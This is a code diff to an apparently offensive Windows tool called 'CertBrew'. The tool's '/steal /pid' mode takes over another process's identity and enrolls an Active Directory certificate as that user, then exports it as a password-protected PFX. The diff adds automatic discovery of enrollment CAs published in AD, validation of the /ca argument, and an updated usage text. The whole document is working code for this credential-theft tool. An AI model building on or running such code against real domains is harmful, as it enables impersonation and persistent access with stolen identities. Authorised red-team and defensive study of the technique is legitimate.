@@ -561,11 +561,107 @@ void OutputData(const std::vector<BYTE>& data, const std::wstring& password) {
     }
 }
 
+
+BOOL ResolveCaConfig(const std::wstring& input, std::wstring& outConfig) {
+    std::wstring wantedHost, wantedCa;
+    BOOL autoPick = input.empty();
+
+    if (!autoPick) {
+        size_t pos = input.find(L'\\');
+        if (pos != std::wstring::npos) {
+            wantedHost = input.substr(0, pos);
+            wantedCa = input.substr(pos + 1);
+        }
+        else {
+            wantedCa = input;
+        }
+    }
+
+    CComPtr<ICertConfig> cfg;
+    HRESULT hr = cfg.CoCreateInstance(__uuidof(CCertConfig));
+    if (FAILED(hr)) {
+        LogMessage(L"[-] CoCreateInstance(CCertConfig) failed: 0x%x\n", hr);
+        return FALSE;
+    }
+
+    LONG count = 0;
+    hr = cfg->Reset(0, &count);
+    if (FAILED(hr) || count == 0) {
+        LogMessage(L"[-] No enrollment services found in AD (hr=0x%x, count=%d).\n", hr, count);
+        return FALSE;
+    }
+
+    LogMessage(L"[*] Enumerating %d CA(s) from AD Enrollment Services...\n", count);
+    std::vector<std::wstring> matches;
+
+    do {
+        CComBSTR cn, srv, conf;
+        if (SUCCEEDED(cfg->GetField(CComBSTR(L"CommonName"), &cn)) &&
+            SUCCEEDED(cfg->GetField(CComBSTR(L"Server"), &srv)) &&
+            SUCCEEDED(cfg->GetField(CComBSTR(L"Config"), &conf))) {
+
+            LogMessage(L"    - %s\n", conf.m_str);
+
+            if (autoPick) {
+                matches.emplace_back(conf);
+            }
+            else if (_wcsicmp(cn, wantedCa.c_str()) == 0) {
+                if (wantedHost.empty()) {
+                    matches.emplace_back(conf);
+                }
+                else {
+                    std::wstring s(srv);
+                    bool eq = (_wcsicmp(s.c_str(), wantedHost.c_str()) == 0);
+                    size_t dot = s.find(L'.');
+                    bool nb = (dot != std::wstring::npos &&
+                        wantedHost.length() == dot &&
+                        _wcsnicmp(s.c_str(), wantedHost.c_str(), dot) == 0);
+                    if (eq || nb) matches.emplace_back(conf);
+                }
+            }
+        }
+        LONG idx = 0;
+        hr = cfg->Next(&idx);
+    } while (hr == S_OK);
+
+    if (matches.empty()) {
+        LogMessage(L"[-] No CA matching '%s' published in AD.\n", input.c_str());
+        return FALSE;
+    }
+    if (matches.size() > 1) {
+        if (autoPick) {
+            LogMessage(L"[-] Multiple CAs available. Specify one with /ca:<config>:\n");
+        }
+        else {
+            LogMessage(L"[-] Ambiguous CA name. Re-run with HOST\\CAName:\n");
+        }
+        for (auto& m : matches) LogMessage(L"      %s\n", m.c_str());
+        return FALSE;
+    }
+
+    outConfig = matches[0];
+    LogMessage(L"[+] CA resolved: %s\n", outConfig.c_str());
+    return TRUE;
+}
+
 // Main certificate enrolment function
 BOOL PerformCertEnroll(const wchar_t* templateName, const wchar_t* caName, const wchar_t* password, const wchar_t* email) {
     LogMessage(L"[*] Initializing COM library...\n");
     CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
 
+    std::wstring resolvedCa;
+    if (caName && *caName) {
+        // CA provided
+        resolvedCa = caName;
+        LogMessage(L"[*] Using provided CA config: %s\n", resolvedCa.c_str());
+    }
+    else {
+        // Query AD for published enrollment services
+        if (!ResolveCaConfig(L"", resolvedCa)) {
+            CoUninitialize();
+            return FALSE;
+        }
+    }
     CComBSTR bstrContainerName;
     CComBSTR bstrProviderName;
     BSTR csr = nullptr;
@@ -575,7 +671,7 @@ BOOL PerformCertEnroll(const wchar_t* templateName, const wchar_t* caName, const
     BOOL success = FALSE;
 
     if (GenerateCSR(templateName, email, &csr, bstrContainerName, bstrProviderName)) {
-        if (SubmitToCA(caName, csr, &certB64)) {
+        if (SubmitToCA(resolvedCa.c_str(), csr, &certB64)) {
             if (CreatePFXInMemory(certB64, bstrContainerName, bstrProviderName, password, pfxData, &pCleanupCert)) {
                 OutputData(pfxData, password);
 
@@ -627,8 +723,20 @@ void PrintUsage(const wchar_t* exe) {
     PrintBanner();
     wprintf(L"Usage:\n");
     wprintf(L"  %s /list\n", exe);
-    wprintf(L"  %s /steal /pid:<PID> /template:<Template> /ca:<CA> /pass:<password> [/email:<email>] [/outfile:<file>]\n", exe);
+    wprintf(L"  %s /steal /pid:<PID> /template:<Template> /pass:<password> [/ca:<CA>] [/email:<email>] [/outfile:<file>]\n", exe);
 }
+
+
+BOOL ValidateCaArgument(const std::wstring& ca) {
+    if (ca.empty()) return TRUE; // empty = auto-pick mode (enumeration)
+    if (ca.find_first_of(L" \t\r\n\"") != std::wstring::npos) return FALSE;
+    size_t pos = ca.find(L'\\');
+    if (pos == std::wstring::npos) return FALSE;                       // must contain HOST\CA
+    if (pos == 0 || pos == ca.length() - 1) return FALSE;
+    if (ca.find(L'\\', pos + 1) != std::wstring::npos) return FALSE;   // exactly one '\'
+    return TRUE;
+}
+
 
 int wmain(int argc, wchar_t* argv[]) {
     if (argc < 2) {
@@ -658,13 +766,23 @@ int wmain(int argc, wchar_t* argv[]) {
         return 0;
     }
 
+
+
     if (doSteal) {
-        if (pid == 0 || tmpl.empty() || ca.empty() || pass.empty()) {
+        if (pid == 0 || tmpl.empty() || pass.empty()) {
             LogMessage(L"[-] Missing arguments for /steal.\n");
             PrintUsage(argv[0]);
             return 1;
         }
-        if (!StealAndEnroll(pid, (wchar_t*)tmpl.c_str(), (wchar_t*)ca.c_str(), (wchar_t*)pass.c_str(), (wchar_t*)email.c_str())) {
+        if (!ValidateCaArgument(ca)) {
+            LogMessage(L"[-] Invalid /ca format. Expected 'HOST\\CAName'.\n");
+            return 1;
+        }
+        if (ca.empty()) {
+            LogMessage(L"[*] No /ca specified - auto-resolution mode.\n");
+        }
+        if (!StealAndEnroll(pid, (wchar_t*)tmpl.c_str(), (wchar_t*)ca.c_str(),
+            (wchar_t*)pass.c_str(), (wchar_t*)email.c_str())) {
             LogMessage(L"[-] CertBrew failed.\n");
             return 1;
         }
